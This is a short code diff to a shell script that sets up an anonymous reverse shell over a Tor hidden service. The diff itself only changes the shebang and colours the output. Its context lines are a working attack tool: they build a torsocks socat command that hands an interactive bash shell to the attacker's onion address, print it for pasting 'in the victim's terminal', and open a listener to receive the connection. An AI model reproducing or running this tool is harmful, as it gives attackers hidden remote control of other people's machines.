@@ -1,4 +1,4 @@
-#!/bin/sh
+#!/bin/bash
 
 tor &
 
@@ -12,7 +12,8 @@ fi
 LPORT=80
 LHOST=$(cat /var/lib/tor/hidden_service/hostname)
 RSHELL="torsocks socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"
+COLOR_YELLOW="\033[1;33m"
 
-echo "\n\nPaste the command in the victim's terminal:\n\n$RSHELL\n\n"
+echo -e "$COLOR_YELLOW""\n\nPaste the command in the victim's terminal:\n\n$RSHELL\n\n"
 
 socat file:$(tty),raw,echo=0 TCP-L:$LPORT
